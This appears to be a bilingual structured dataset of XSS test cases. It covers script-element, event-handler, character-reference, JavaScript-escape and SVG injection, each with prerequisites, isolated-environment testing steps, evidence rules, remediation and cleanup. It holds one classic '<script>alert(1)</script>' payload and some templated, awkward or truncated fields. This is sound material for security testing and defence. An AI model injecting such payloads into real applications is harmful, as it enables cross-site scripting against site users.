name.zh: 基础脚本元素注入

description.zh: 验证不可信输入进入 HTML 元素上下文后，是否能够形成并执行 script 元素；保留多种无害可观察函数作为解析差异样例。
description.en: Validates whether untrusted input can form and execute a script element in an HTML element context, using harmless observable functions to compare parser behavior.

overview.zh: 基础脚本元素注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：输入是否越过文本节点边界并被 HTML 解析器创建为可执行 script 元素。测试成立的前提为：应用把原始值拼接进 HTML 响应或危险 DOM 写入点，且没有执行与位置匹配的输出编码。证据要求为：唯一测试标记对应的 JavaScript 执行记录，而不是响应体中出现了尖括号文本。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Basic Script Element Injection checks whether input crosses a text-node boundary and is created as an executable script element by the HTML parser. It applies when the application concatenates the raw value into an HTML response or dangerous DOM write sink without context-appropriate output encoding. A conclusion requires a JavaScript execution record tied to the unique test marker, not merely angle-bracket text appearing in the response; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：应用把原始值拼接进 HTML 响应或危险 DOM 写入点，且没有执行与位置匹配的输出编码。审查时必须确认“输入是否越过文本节点边界并被 HTML 解析器创建为可执行 script 元素”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“唯一测试标记对应的 JavaScript 执行记录，而不是响应体中出现了尖括号文本”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the application concatenates the raw value into an HTML response or dangerous DOM write sink without context-appropriate output encoding, allowing whether input crosses a text-node boundary and is created as an executable script element by the HTML parser. Review the input source, final parsing context, browser or policy version, and a JavaScript execution record tied to the unique test marker, not merely angle-bracket text appearing in the response; otherwise record only an unconfirmed control differential.

exploitation.zh: 先以普通文本建立编码基线，再在同一参数中提交原集合，逐条确认标签是否进入 DOM、脚本是否被 CSP 阻止以及事件是否只触发一次。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, establish an encoding baseline with plain text, then submit the original set through the same parameter and check DOM creation, CSP enforcement, and single execution per marker. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 按 HTML 文本上下文编码输出，禁止把不可信值交给 innerHTML、document.write 或模板原样输出，并以严格 CSP 作为纵深防御。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should encode for the HTML text context, keep untrusted values out of innerHTML, document.write, and raw template output, and use a strict CSP as defense in depth. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 定位“基础脚本元素注入”的输出上下文
title.en: Scope the Basic Script Element Injection data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“应用把原始值拼接进 HTML 响应或危险 DOM 写入点，且没有执行与位置匹配的输出编码”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that the application concatenates the raw value into an HTML response or dangerous DOM write sink without context-appropriate output encoding, and record browser, response-header, and relevant component versions.

title.zh: 建立“HTML 元素上下文”解析基线
title.en: Establish the HTML Element Context baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“唯一测试标记对应的 JavaScript 执行记录，而不是响应体中出现了尖括号文本”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only a JavaScript execution record tied to the unique test marker, not merely angle-bracket text appearing in the response as valid evidence.

title.zh: 逐条重放“基础脚本元素注入”样例
title.en: Run a single-variable Basic Script Element Injection check

description.zh: 先以普通文本建立编码基线，再在同一参数中提交原集合，逐条确认标签是否进入 DOM、脚本是否被 CSP 阻止以及事件是否只触发一次；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: establish an encoding baseline with plain text, then submit the original set through the same parameter and check DOM creation, CSP enforcement, and single execution per marker; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<script>alert(1)</script>

title.zh: 修复并回归“基础脚本元素注入”
title.en: Retest the Basic Script Element Injection remediation boundary

description.zh: 按 HTML 文本上下文编码输出，禁止把不可信值交给 innerHTML、document.write 或模板原样输出，并以严格 CSP 作为纵深防御；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while a JavaScript execution record tied to the unique test marker, not merely angle-bracket text appearing in the response no longer appears.

review.rationale: 基础脚本元素注入保留为 Payload，用于审查“输入是否越过文本节点边界并被 HTML 解析器创建为可执行 script 元素”。成立时必须满足证据要求“唯一测试标记对应的 JavaScript 执行记录，而不是响应体中出现了尖括号文本”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 可控输入确实进入浏览器解析的 HTML 元素上下文，且输出位置不在纯文本、模板或已禁用脚本的容器中。
prerequisites.en: Controllable input reaches an HTML element context parsed by the browser rather than a text-only, template, or script-disabled container.

prerequisites.zh: 隔离页面使用一次性固定 marker 函数，并可保存响应源码、解析后 DOM、CSP 控制台和对应请求 ID。
prerequisites.en: An isolated page uses a one-time fixed marker function and preserves response source, parsed DOM, CSP console output, and the corresponding request identifier.

analysis.zh: 阳性证据是响应中的输入被浏览器构造成 script 元素，并在应用页面来源下执行一次性 marker；源码、DOM 节点、调用栈和请求 ID 必须相互对应。 假阳性边界：仅看到字符串回显、静态扫描器告警、script 文本位于 textarea/template 中、CSP 阻止执行或浏览器扩展触发弹窗都不是成功 XSS。
analysis.en: Positive evidence requires the reflected input to become a script element and execute a one-time marker under the application origin, with source, DOM node, call stack, and request identifier correlated. False-positive boundary: String reflection, a scanner alert, script text inside textarea or template, CSP-blocked execution, or a browser-extension popup does not prove XSS.

opsecTips.zh: 基础脚本元素注入只运行固定 marker；出现 cookie/存储读取、网络外发、页面导航、持久写入或非测试用户会话时立即停止。
opsecTips.en: Basic Script Element Injection uses only a fixed marker; stop on cookie or storage access, egress, navigation, persistent writes, or any non-test user session.

opsecTips.zh: 删除注入记录与测试页面，清理模板/CDN 缓存和浏览器站点数据，移除 marker 函数并确认页面重载后不再执行。
opsecTips.en: Delete injected records and test pages, clear template and CDN caches plus browser site data, remove the marker function, and confirm no execution after reload.

name.zh: HTML 事件处理器注入

description.zh: 覆盖 img、svg、body、input 等元素的事件属性，验证输入能否逃逸属性或元素边界并注册可执行事件处理器。
description.en: Covers event attributes on img, svg, body, input, and related elements to test whether input can escape an attribute or element boundary and register executable handlers.

overview.zh: HTML 事件处理器注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：浏览器是否把注入片段解析为 onerror、onload、onfocus 等事件属性并在对应生命周期触发。测试成立的前提为：模板允许用户值闭合现有属性或插入新元素，同时缺少属性值编码、元素白名单与 HTML 消毒。证据要求为：指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: HTML Event Handler Injection checks whether the browser parses the injected fragment as onerror, onload, onfocus, or another event attribute and triggers it at the relevant lifecycle point. It applies when a template lets user data close an existing attribute or create a new element without attribute encoding, an element allowlist, or HTML sanitization. A conclusion requires the unique marker recorded when the specified element event fires, together with the final DOM and event type; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：模板允许用户值闭合现有属性或插入新元素，同时缺少属性值编码、元素白名单与 HTML 消毒。审查时必须确认“浏览器是否把注入片段解析为 onerror、onload、onfocus 等事件属性并在对应生命周期触发”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when a template lets user data close an existing attribute or create a new element without attribute encoding, an element allowlist, or HTML sanitization, allowing whether the browser parses the injected fragment as onerror, onload, onfocus, or another event attribute and triggers it at the relevant lifecycle point. Review the input source, final parsing context, browser or policy version, and the unique marker recorded when the specified element event fires, together with the final DOM and event type; otherwise record only an unconfirmed control differential.

exploitation.zh: 分别选择自动触发与需要焦点、悬停或展开的样例，在相同页面状态下逐一重放，记录哪些元素与事件仍被消毒器允许。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, replay automatic and interaction-dependent samples separately under the same page state, recording which elements and events survive sanitization. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 使用维护中的 HTML 消毒器移除事件属性和危险元素，对必须保留的属性执行上下文编码，并避免通过字符串拼接创建 DOM。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should use a maintained HTML sanitizer to remove event attributes and dangerous elements, encode any retained attributes for their context, and avoid string-based DOM construction. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 修复并回归“HTML 事件处理器注入”
title.en: Retest the HTML Event Handler Injection remediation boundary

description.zh: 使用维护中的 HTML 消毒器移除事件属性和危险元素，对必须保留的属性执行上下文编码，并避免通过字符串拼接创建 DOM；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the unique marker recorded when the specified element event fires, together with the final DOM and event type no longer appears.

review.rationale: HTML 事件处理器注入保留为 Payload，用于审查“浏览器是否把注入片段解析为 onerror、onload、onfocus 等事件属性并在对应生命周期触发”。成立时必须满足证据要求“指定元素事件触发时记录的唯一标记，并同时保存最终 DOM 与事件类型”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 输入能够闭合或创建 HTML 属性/元素，目标浏览器支持相应事件，并可确定 onerror、onload、onfocus 等事件的真实触发条件。
prerequisites.en: Input can close or create an HTML attribute or element, the target browser supports the event, and the real trigger condition for onerror, onload, or focus is known.

prerequisites.zh: 测试资源可确定地产生成功或失败状态，事件处理器仅调用一次性 marker，并启用 DOM 与事件监听审计。
prerequisites.en: Test resources deterministically succeed or fail, handlers call only a one-time marker, and DOM plus event-listener auditing is enabled.

analysis.zh: 阳性证据是浏览器将属性注册为事件处理器，在预期资源或焦点事件发生时由该处理器执行 marker，并能从事件目标与调用栈定位到注入节点。 假阳性边界：元素或 on* 字符串出现在 DOM 中但事件不受支持、未触发、被 sanitizer 删除，或 marker 来自测试人员手工点击控制台，都属于假阳性。
analysis.en: Positive evidence requires the browser to register the attribute as an event handler and execute the marker on the expected resource or focus event, with event target and call stack tied to the injected node. False-positive boundary: An element or on* string in the DOM is a false positive when the event is unsupported, never fires, is removed by a sanitizer, or the marker came from manual console interaction.

opsecTips.zh: HTML 事件处理器注入每次只触发一个无害事件；出现表单提交、窗口打开、重复事件循环、外部资源请求或用户交互劫持时停止。
opsecTips.en: HTML Event Handler Injection triggers one harmless event per run; stop on form submission, window opening, event loops, external resource requests, or hijacked user interaction.

opsecTips.zh: 移除测试元素和事件监听器，撤销临时资源失败规则，清空页面缓存与会话 DOM，并重载确认不再有残留处理器。
opsecTips.en: Remove test elements and event listeners, revert temporary resource-failure rules, clear page caches and session DOM, and reload to confirm no handler remains.

name.zh: HTML 字符引用解码差异

description.zh: 验证十进制与十六进制字符引用在属性值和脚本相关上下文中的解码顺序，识别过滤前后规范化不一致导致的 XSS。
description.en: Tests decimal and hexadecimal character-reference decoding order in attribute and script-adjacent contexts to identify XSS caused by normalization mismatches.

overview.zh: HTML 字符引用解码差异用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：安全过滤器与浏览器对 HTML 字符引用的解码次数、位置和结果是否一致。测试成立的前提为：过滤逻辑在编码形态上匹配危险字符，而后续 HTML 解析器把实体还原为括号、引号或可执行属性内容。证据要求为：解析后的 DOM 属性值与唯一执行标记同时出现，并能用普通编码对照排除模板二次转义。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: HTML Character Reference Decoding Differences checks whether the security filter and browser agree on when, where, and how many times HTML character references are decoded. It applies when filtering matches the encoded representation while a later HTML parser restores parentheses, quotes, or executable attribute content. A conclusion requires the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：过滤逻辑在编码形态上匹配危险字符，而后续 HTML 解析器把实体还原为括号、引号或可执行属性内容。审查时必须确认“安全过滤器与浏览器对 HTML 字符引用的解码次数、位置和结果是否一致”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“解析后的 DOM 属性值与唯一执行标记同时出现，并能用普通编码对照排除模板二次转义”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when filtering matches the encoded representation while a later HTML parser restores parentheses, quotes, or executable attribute content, allowing whether the security filter and browser agree on when, where, and how many times HTML character references are decoded. Review the input source, final parsing context, browser or policy version, and the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping; otherwise record only an unconfirmed control differential.

exploitation.zh: 对同一危险字符依次提交原字符、十进制实体和十六进制实体，比较服务端响应、DOM 属性值与执行结果，确认差异发生在哪一层。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, submit the literal character, decimal reference, and hexadecimal reference through the same sink, comparing the response, DOM attribute value, and execution result to locate the differing layer. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 先按统一字符集解码和规范化输入，再依据最终输出上下文编码；不要依赖黑名单匹配编码片段，并避免重复解码不可信数据。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should decode and canonicalize with one character set before validation, then encode for the final output context; avoid encoded-string blacklists and repeated decoding of untrusted data. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 定位“HTML 字符引用解码差异”的输出上下文
title.en: Scope the HTML Character Reference Decoding Differences data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“过滤逻辑在编码形态上匹配危险字符，而后续 HTML 解析器把实体还原为括号、引号或可执行属性内容”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that filtering matches the encoded representation while a later HTML parser restores parentheses, quotes, or executable attribute content, and record browser, response-header, and relevant component versions.

title.zh: 建立“HTML 解码与规范化”解析基线
title.en: Establish the HTML Decoding and Normalization baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“解析后的 DOM 属性值与唯一执行标记同时出现，并能用普通编码对照排除模板二次转义”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping as valid evidence.

title.zh: 逐条重放“HTML 字符引用解码差异”样例
title.en: Run a single-variable HTML Character Reference Decoding Differences check

description.zh: 对同一危险字符依次提交原字符、十进制实体和十六进制实体，比较服务端响应、DOM 属性值与执行结果，确认差异发生在哪一层；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: submit the literal character, decimal reference, and hexadecimal reference through the same sink, comparing the response, DOM attribute value, and execution result to locate the differing layer; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
hover
hover

title.zh: 修复并回归“HTML 字符引用解码差异”
title.en: Retest the HTML Character Reference Decoding Differences remediation boundary

description.zh: 先按统一字符集解码和规范化输入，再依据最终输出上下文编码；不要依赖黑名单匹配编码片段，并避免重复解码不可信数据；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the decoded DOM attribute value and unique execution marker appear together, with a normal-encoding control excluding template double escaping no longer appears.

review.rationale: HTML 字符引用解码差异保留为 Payload，用于审查“安全过滤器与浏览器对 HTML 字符引用的解码次数、位置和结果是否一致”。成立时必须满足证据要求“解析后的 DOM 属性值与唯一执行标记同时出现，并能用普通编码对照排除模板二次转义”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 能够记录字符引用在代理、应用模板、HTML tokenizer 和 DOM 属性值中的每一次解码结果与顺序。
prerequisites.en: Every character-reference decoding result and order across proxy, application template, HTML tokenizer, and DOM attribute value can be recorded.

prerequisites.zh: 同一上下文准备未编码、十进制引用、十六进制引用和双重编码的固定 marker 对照，并关闭无关浏览器扩展。
prerequisites.en: The same context has plain, decimal-reference, hexadecimal-reference, and double-encoded fixed-marker controls, with unrelated browser extensions disabled.

analysis.zh: 阳性证据是过滤器检查的值与浏览器最终解码值不同，解码后恢复可执行事件或脚本语法并由注入节点执行 marker。 假阳性边界：字符引用被解码成普通文本、仅在查看源码时呈现危险字符、DOM 中保持转义，或响应差异没有任何执行事件，均不是 XSS。
analysis.en: Positive evidence requires a difference between the filter-inspected value and the browser's final decoded value that restores executable event or script syntax and runs the marker from the injected node. False-positive boundary: References decoded to plain text, dangerous characters visible only in source view, still-escaped DOM output, or response differences without an execution event are not XSS.

opsecTips.zh: HTML 字符引用测试每轮只改变一种编码层；发现二次解码扩散到日志、邮件或其他非测试渲染器时立即停止。
opsecTips.en: HTML Character Reference testing changes one encoding layer per run; stop if secondary decoding propagates into logs, email, or another non-test renderer.

opsecTips.zh: 清除含编码样例的数据库记录、模板缓存和代理缓存，关闭解码跟踪，并用普通实体输入回归确认渲染恢复。
opsecTips.en: Remove encoded samples from storage plus template and proxy caches, disable decoding traces, and regress with ordinary entities to confirm normal rendering.

name.zh: JavaScript 转义与动态解码注入
name.en: JavaScript Escape and Dynamic Decoding Injection

description.zh: 覆盖十六进制、八进制、Base64、属性拼接等 JavaScript 表达方式，验证过滤器与脚本引擎之间的规范化差异。
description.en: Covers hexadecimal, octal, Base64, and property-concatenation forms to test normalization differences between filtering logic and the JavaScript engine.

overview.zh: JavaScript 转义与动态解码注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：脚本引擎是否在运行时把转义序列、字符串拼接或 Base64 内容恢复为原本被过滤的可调用标识符。测试成立的前提为：不可信数据已经进入可执行 JavaScript 上下文，而防护只匹配 alert、script 等表面词法形式，没有阻止动态求值。证据要求为：浏览器控制台或测试钩子记录到解码后的函数调用，且相同字符串放入纯文本节点时不会执行。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: JavaScript Escape and Dynamic Decoding Injection checks whether the JavaScript engine reconstructs a filtered callable identifier at runtime from escape sequences, string concatenation, or Base64 content. It applies when untrusted data already reaches executable JavaScript while defenses only match surface tokens such as alert or script and still permit dynamic evaluation. A conclusion requires a browser console or test hook records the decoded function call while the same string remains inert in a plain text node; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：不可信数据已经进入可执行 JavaScript 上下文，而防护只匹配 alert、script 等表面词法形式，没有阻止动态求值。审查时必须确认“脚本引擎是否在运行时把转义序列、字符串拼接或 Base64 内容恢复为原本被过滤的可调用标识符”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“浏览器控制台或测试钩子记录到解码后的函数调用，且相同字符串放入纯文本节点时不会执行”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when untrusted data already reaches executable JavaScript while defenses only match surface tokens such as alert or script and still permit dynamic evaluation, allowing whether the JavaScript engine reconstructs a filtered callable identifier at runtime from escape sequences, string concatenation, or Base64 content. Review the input source, final parsing context, browser or policy version, and a browser console or test hook records the decoded function call while the same string remains inert in a plain text node; otherwise record only an unconfirmed control differential.

exploitation.zh: 在已确认的 JavaScript sink 中逐一重放转义、拼接与 atob 变体，比较源代码文本、运行时值和 CSP 违规日志，不跨上下文套用结论。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, replay escape, concatenation, and atob variants only in a confirmed JavaScript sink, comparing source text, runtime values, and CSP violation logs without extrapolating across contexts. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止把用户输入插入脚本源代码，使用 JSON 序列化传递数据并通过固定函数处理；移除 eval、Function 和字符串形式的定时器。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should do not interpolate user input into script source; pass data through JSON serialization and fixed functions, and remove eval, Function, and string-based timers. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 定位“JavaScript 转义与动态解码注入”的输出上下文
title.en: Scope the JavaScript Escape and Dynamic Decoding Injection data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“不可信数据已经进入可执行 JavaScript 上下文，而防护只匹配 alert、script 等表面词法形式，没有阻止动态求值”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that untrusted data already reaches executable JavaScript while defenses only match surface tokens such as alert or script and still permit dynamic evaluation, and record browser, response-header, and relevant component versions.

title.zh: 建立“JavaScript 解码上下文”解析基线
title.en: Establish the JavaScript Decoding Context baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“浏览器控制台或测试钩子记录到解码后的函数调用，且相同字符串放入纯文本节点时不会执行”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only a browser console or test hook records the decoded function call while the same string remains inert in a plain text node as valid evidence.

title.zh: 逐条重放“JavaScript 转义与动态解码注入”样例
title.en: Run a single-variable JavaScript Escape and Dynamic Decoding Injection check

description.zh: 在已确认的 JavaScript sink 中逐一重放转义、拼接与 atob 变体，比较源代码文本、运行时值和 CSP 违规日志，不跨上下文套用结论；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: replay escape, concatenation, and atob variants only in a confirmed JavaScript sink, comparing source text, runtime values, and CSP violation logs without extrapolating across contexts; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 修复并回归“JavaScript 转义与动态解码注入”
title.en: Retest the JavaScript Escape and Dynamic Decoding Injection remediation boundary

description.zh: 禁止把用户输入插入脚本源代码，使用 JSON 序列化传递数据并通过固定函数处理；移除 eval、Function 和字符串形式的定时器；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while a browser console or test hook records the decoded function call while the same string remains inert in a plain text node no longer appears.

review.rationale: JavaScript 转义与动态解码注入保留为 Payload，用于审查“脚本引擎是否在运行时把转义序列、字符串拼接或 Base64 内容恢复为原本被过滤的可调用标识符”。成立时必须满足证据要求“浏览器控制台或测试钩子记录到解码后的函数调用，且相同字符串放入纯文本节点时不会执行”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 可控字符串处于 JavaScript 源码或会被 eval、Function、atob 等动态解码器处理的路径，而非普通 HTML 文本。
prerequisites.en: The controllable string is in JavaScript source or a path processed by eval, Function, atob, or another dynamic decoder rather than ordinary HTML text.

prerequisites.zh: 已对动态求值和解码 API 加入只读调用跟踪，使用仅设置固定内存标志的 marker，并记录解码前后字符串。
prerequisites.en: Dynamic evaluation and decoding APIs have read-only call tracing, the marker only sets a fixed in-memory flag, and pre- and post-decoding strings are recorded.

analysis.zh: 阳性证据是目标脚本引擎将转义或 Base64 输入还原为可执行表达式，随后由真实动态 sink 编译并执行 marker，调用栈可回溯到可控来源。 假阳性边界：成功解码但结果只被显示、语法错误、CSP unsafe-eval 阻断、测试人员在控制台手工 eval，或关键字匹配均不能证明注入。
analysis.en: Positive evidence requires the target engine to reconstruct an executable expression from escaped or Base64 input and a real dynamic sink to compile and run the marker, with the call stack traced to the controllable source. False-positive boundary: Successful decoding followed only by display, a syntax error, CSP unsafe-eval blocking, manual console eval, or keyword matching does not prove injection.

opsecTips.zh: JavaScript 转义测试禁止编码系统命令、网络地址或敏感对象引用；出现动态外连、定时器风暴或全局状态污染时停止。
opsecTips.en: JavaScript escape testing must not encode system commands, network destinations, or sensitive object references; stop on dynamic egress, timer storms, or global-state pollution.

opsecTips.zh: 撤销 API instrumentation，删除测试脚本和本地存储标记，取消遗留定时器并重载隔离页面确认全局对象已恢复。
opsecTips.en: Remove API instrumentation, test scripts, and local-storage markers, cancel residual timers, and reload the isolated page to confirm globals are restored.

name.zh: SVG 活动内容注入

description.zh: 验证 SVG 命名空间中的 script、动画事件、foreignObject 与外部引用是否被当作活动内容执行，而非普通图片数据。
description.en: Tests whether script, animation events, foreignObject, and external references in the SVG namespace execute as active content rather than inert image data.

overview.zh: SVG 活动内容注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：上传、富文本或内联模板是否允许 SVG 活动元素和事件穿过消毒边界进入文档命名空间。测试成立的前提为：系统仅按文件扩展名或 image/svg+xml 接受内容，却在同源文档中内联渲染或允许 foreignObject、script 与动画事件。证据要求为：SVG 进入最终 DOM 后的命名空间、被保留的活动节点以及唯一执行标记三者可以关联。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: SVG Active Content Injection checks whether upload, rich-text, or inline-template handling lets active SVG elements and events cross the sanitization boundary into the document namespace. It applies when the system trusts an extension or image/svg+xml type but renders the file inline on the application origin or permits foreignObject, script, and animation events. A conclusion requires the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：系统仅按文件扩展名或 image/svg+xml 接受内容，却在同源文档中内联渲染或允许 foreignObject、script 与动画事件。审查时必须确认“上传、富文本或内联模板是否允许 SVG 活动元素和事件穿过消毒边界进入文档命名空间”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“SVG 进入最终 DOM 后的命名空间、被保留的活动节点以及唯一执行标记三者可以关联”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the system trusts an extension or image/svg+xml type but renders the file inline on the application origin or permits foreignObject, script, and animation events, allowing whether upload, rich-text, or inline-template handling lets active SVG elements and events cross the sanitization boundary into the document namespace. Review the input source, final parsing context, browser or policy version, and the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM; otherwise record only an unconfirmed control differential.

exploitation.zh: 分别以 img 引用、独立文件打开和内联 SVG 三种方式加载同一安全标记样例，确认只有真实产品渲染路径中的执行才算成立。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, load the same marker through img embedding, standalone navigation, and inline SVG, counting only execution in the actual product rendering path. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 将用户 SVG 作为隔离下载或可信转换后的位图提供；若必须保留 SVG，使用命名空间感知消毒器移除脚本、事件、foreignObject 与外部引用。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should serve user SVG as an isolated download or trusted rasterized output; when SVG is required, use a namespace-aware sanitizer that removes scripts, events, foreignObject, and external references. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 定位“SVG 活动内容注入”的输出上下文
title.en: Scope the SVG Active Content Injection data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“系统仅按文件扩展名或 image/svg+xml 接受内容，却在同源文档中内联渲染或允许 foreignObject、script 与动画事件”，并记录模板、消毒器和浏览器版本。

title.zh: 建立“SVG 命名空间”解析基线
title.en: Establish the SVG Namespace baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“SVG 进入最终 DOM 后的命名空间、被保留的活动节点以及唯一执行标记三者可以关联”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM as valid evidence.

title.zh: 逐条重放“SVG 活动内容注入”样例
title.en: Run a single-variable SVG Active Content Injection check

description.zh: 分别以 img 引用、独立文件打开和内联 SVG 三种方式加载同一安全标记样例，确认只有真实产品渲染路径中的执行才算成立；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: load the same marker through img embedding, standalone navigation, and inline SVG, counting only execution in the actual product rendering path; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 修复并回归“SVG 活动内容注入”
title.en: Retest the SVG Active Content Injection remediation boundary

